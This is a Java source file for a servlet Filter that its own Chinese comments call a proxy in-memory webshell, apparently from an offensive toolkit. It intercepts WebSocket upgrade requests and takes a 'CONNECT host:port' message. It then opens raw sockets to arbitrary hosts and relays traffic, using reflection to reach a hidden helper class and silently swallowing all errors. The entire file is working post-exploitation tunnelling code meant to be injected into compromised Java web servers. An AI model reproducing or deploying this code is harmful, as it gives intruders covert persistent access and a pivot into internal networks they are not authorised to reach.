package com.reajason.javaweb.memshell.shelltool.wsproxy;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.Charset;

/**
 * 不依赖容器 WebSocket 实现的代理内存马。
 * <p>
 * 第一条消息为 {@code CONNECT host:port}；目标端到客户端的泵送由 helper 的
 * startPump 负责，客户端到目标端由本类直接写入目标 socket。
 *
 * @author ReaJason
 */
public class ProxyRawWebSocket implements Filter {

    private static final Charset UTF8 = Charset.forName("UTF-8");

    private static Method sendTextMethod;
    private static Method getAttributeMethod;
    private static Method setAttributeMethod;
    private static Method startPumpMethod;
    private static Method closeMethod;

    private final Class<?> helperClass;

    public ProxyRawWebSocket() {
        this(resolveHelperClass(ProxyRawWebSocket.class));
    }

    public ProxyRawWebSocket(Class<?> helperClass) {
        this.helperClass = helperClass;
    }

    /**
     * 后缀必须与 RawWsHelperNames.HELPER_SUFFIX 一致；模板运行时不能依赖 api jar。
     */
    private static Class<?> resolveHelperClass(Class<?> shellClass) {
        try {
            return Class.forName(shellClass.getName() + "$RawWsHelper", false, shellClass.getClassLoader());
        } catch (Throwable ignored) {
            return null;
        }
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (!(request instanceof HttpServletRequest) || !(response instanceof HttpServletResponse)) {
            chain.doFilter(request, response);
            return;
        }
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String wsKey = httpRequest.getHeader("Sec-WebSocket-Key");
        if (wsKey == null || !"GET".equalsIgnoreCase(httpRequest.getMethod())) {
            chain.doFilter(request, response);
            return;
        }
        String version = httpRequest.getHeader("Sec-WebSocket-Version");
        if (version != null && !"13".equals(version.trim())) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(426);
            httpResponse.setHeader("Sec-WebSocket-Version", "13");
            return;
        }
        if (helperClass != null) {
            try {
                Object helper = helperClass.newInstance();
                if (helper.equals(new Object[]{request, response, this})) {
                    return;
                }
            } catch (Throwable ignored) {
            }
        }
        chain.doFilter(request, response);
    }

    public void onStart(Object helper) {
    }

    public void onReadBinary(Object helper, byte[] data) {
        Object socket = getAttribute(helper, "socket");
        if (socket == null) {
            connect(helper, new String(data, UTF8));
            return;
        }
        try {
            OutputStream output = (OutputStream) getAttribute(helper, "output");
            if (output == null) {
                output = ((Socket) socket).getOutputStream();
                setAttribute(helper, "output", output);
            }
            output.write(data);
            output.flush();
        } catch (Throwable ignored) {
        }
    }

    public void onReadText(Object helper, String text) {
        onReadBinary(helper, text.getBytes(UTF8));
    }

    public void onDisconnect(Object helper) {
        Object socket = getAttribute(helper, "socket");
        if (socket instanceof Socket) {
            try {
                ((Socket) socket).close();
            } catch (Throwable ignored) {
            }
        }
    }

    private void connect(Object helper, String message) {
        String[] values = message.split(" ");
        if (values.length < 2) {
            reject(helper, "400 Bad Request");
            return;
        }
        String[] address = values[1].split(":");
        if (address.length < 2) {
            reject(helper, "400 Bad Request");
            return;
        }
        Socket socket = new Socket();
        try {
            socket.connect(new InetSocketAddress(address[0], Integer.parseInt(address[1])), 10000);
            setAttribute(helper, "socket", socket);
            sendText(helper, "HTTP/1.1 200 Connection Established\r\n\r\n");
            startPump(helper, socket.getInputStream());
        } catch (Throwable ignored) {
            closeQuietly(socket);
            reject(helper, "503 Service Unavailable");
        }
    }

    /**
     * 建连失败或 CONNECT 报文非法时，先给客户端一个 HTTP 语义的响应，再关闭会话；
     * 否则帧循环会一直挂在读上，直到客户端自己断开。
     */
    private static void reject(Object helper, String status) {
        sendText(helper, "HTTP/1.1 " + status + "\r\n\r\n");
        close(helper);
    }

    private static void closeQuietly(Socket socket) {
        try {
            socket.close();
        } catch (Throwable ignored) {
        }
    }

    private static void sendText(Object helper, String text) {
        try {
            Method method = sendTextMethod;
            if (method == null) {
                method = helper.getClass().getMethod("sendText", String.class);
                sendTextMethod = method;
            }
            method.invoke(helper, text);
        } catch (Throwable ignored) {
        }
    }

    private static Object getAttribute(Object helper, String name) {
        try {
            Method method = getAttributeMethod;
            if (method == null) {
                method = helper.getClass().getMethod("getAttribute", String.class);
                getAttributeMethod = method;
            }
            return method.invoke(helper, name);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void setAttribute(Object helper, String name, Object value) {
        try {
            Method method = setAttributeMethod;
            if (method == null) {
                method = helper.getClass().getMethod("setAttribute", String.class, Object.class);
                setAttributeMethod = method;
            }
            method.invoke(helper, name, value);
        } catch (Throwable ignored) {
        }
    }

    private static void startPump(Object helper, InputStream inputStream) {
        try {
            Method method = startPumpMethod;
            if (method == null) {
                method = helper.getClass().getMethod("startPump", InputStream.class);
                startPumpMethod = method;
            }
            method.invoke(helper, inputStream);
        } catch (Throwable ignored) {
        }
    }

    private static void close(Object helper) {
        try {
            Method method = closeMethod;
            if (method == null) {
                method = helper.getClass().getMethod("close", new Class[0]);
                closeMethod = method;
            }
            method.invoke(helper, new Object[0]);
        } catch (Throwable ignored) {
        }
    }
}
